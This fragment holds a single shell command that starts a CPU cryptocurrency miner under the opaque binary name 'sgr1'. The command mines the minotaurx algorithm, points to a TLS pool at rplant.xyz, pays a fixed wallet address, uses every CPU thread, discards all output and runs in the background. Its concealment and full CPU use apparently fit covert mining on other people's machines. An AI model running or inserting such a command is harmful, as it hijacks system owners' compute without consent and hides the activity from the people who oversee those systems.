...
./sgr1 --algorithm minotaurx --pool stratum+tcps://stratum-asia.rplant.xyz:17068 --wallet RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$(echo $RANDOM | md5sum | head -c 5) --password x --tls true --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
